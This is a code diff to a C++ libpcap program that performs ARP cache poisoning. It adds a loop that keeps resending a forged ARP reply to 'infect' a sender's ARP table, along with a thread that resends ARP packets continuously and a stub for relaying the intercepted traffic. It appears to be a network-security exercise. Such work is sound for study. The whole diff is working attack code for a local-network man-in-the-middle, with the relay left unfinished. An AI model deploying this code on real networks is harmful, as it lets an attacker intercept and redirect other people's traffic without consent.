@@ -1,5 +1,26 @@
 #include "main.h"
 
+void spoofProcess(int mode, pcap_t *handle, EthArpPacket pkt)
+{
+	struct pcap_pkthdr *header;
+	const u_char *packet;
+	while(true)
+	{
+		int result = pcap_next_ex(handle, &header, &packet);
+		if (result == 0)
+			continue;
+		if (result == PCAP_ERROR || result == PCAP_ERROR_BREAK)
+		{
+			printf("pcap_next_ex return %d(%s)\n", result, pcap_geterr(handle));
+			break;
+		}
+		if (/*Reinfection function*/true)
+			sendArp(handle, pkt);
+		// else
+			/*relay function*/
+	}
+}
+
 int main(int argc, char *argv[])
 {
 	// parameter check
@@ -52,7 +73,17 @@ int main(int argc, char *argv[])
 		
 
 		// Send ARP Reply packet to infect sender's ARP table
-		sendArp(handle, EthArpPacket(ArpHdr::Reply, senderMac, attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, targetIp, senderMac, senderIp));
+		EthArpPacket pkt = EthArpPacket(ArpHdr::Reply, senderMac, attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, targetIp, senderMac, senderIp);
+		sendArp(handle, pkt);
+
+		std::thread sendArpThread(continueSendArp, handle, 10);
+
+		while (true)
+		{
+			spoofProcess(ArpHdr::Reply, handle, pkt);
+		}
+		sendArpThread.detach();
+
 
 		pcap_close(handle);
 	}
